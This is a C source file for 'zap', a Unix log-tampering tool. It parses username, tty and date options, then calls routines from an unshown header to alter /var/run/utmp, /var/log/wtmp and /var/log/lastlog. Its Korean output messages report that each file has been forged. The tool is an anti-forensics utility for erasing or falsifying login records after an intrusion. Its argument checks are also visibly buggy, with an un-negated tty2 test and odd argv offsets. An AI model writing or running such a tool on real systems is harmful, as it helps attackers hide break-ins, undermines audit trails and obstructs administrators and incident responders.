#include "kill.h"
#define bzero(x, y) memset(x, 0, y)
 
int f;

void usage(){
    printf("usage: zap [-A username] or [-a username -t tty -d mmddyy] or [-R username1 username2 -t tty1 tty2 -d mmddyy1 mmddyy2\n");
}
 
int main(int argc,char *argv[])
{   
    int c;
    aFlag=0;
    RFlag=0;
    AFlag=0;
    tFlag=0;
    dFlag=0;
    lasttime1 = 0;
    lasttime2 = 0;

    while((c=getopt(argc,argv,"A:a:t:d:R:"))!=EOF){
        switch (c)
        {
        case 'A':
            AFlag=1;
            username1=optarg;
            break;
        case 'a':
            aFlag=1;
            username1 = optarg;
            break;
        case 't':
            tFlag=1;
            tty1 = optarg;
            break;
        case 'd':
            dFlag=1;
            mmddyy1 = optarg;
            break;
        case 'R':
            RFlag=1;
            aFlag=1;
            dFlag=1;
            username1 = optarg;
            username2 = argv[optind];
            tty1 = argv[optind+2];
            tty2 = argv[optind+3];

            mmddyy1 = argv[optind+5];
            mmddyy2 = argv[optind+6];
            if(!tty1||tty2||!mmddyy1||!mmddyy2){
                printf("please input -t option and -d option!\n");
                return 0;
            }

            break;
        case '?':
            printf("unknown flag: %c \n",optopt);
            usage();
            return 0;
            break;
        default:
            usage();
            return 0;
            break;
        }
    }

    if(kill_tmp("/var/run/utmp")==-1){
        return 0;
    }else{
        printf("utmp파일 위조 완료\n");
    }
    if(kill_tmp("/var/log/wtmp")==-1){
        return 0;
    }else{
        printf("wtmp파일 위조 완료\n");
    }
    if(RFlag){
        if(getpwnam(username1)==NULL){
            printf("%s: 존재하지 않은 유저 이름입니다!\n",username1);
            return 0;
        }
        if(getpwnam(username2)==NULL){
            printf("%s: 존재하지 않은 유저 이름입니다!\n",username2);
            return 0;
        }
    }
    
    if(kill_lastlog("/var/log/lastlog")==-1){
        return 0;
    }else{
        printf("lastlog파일 위조 성공\n");
    }

    return 0;
}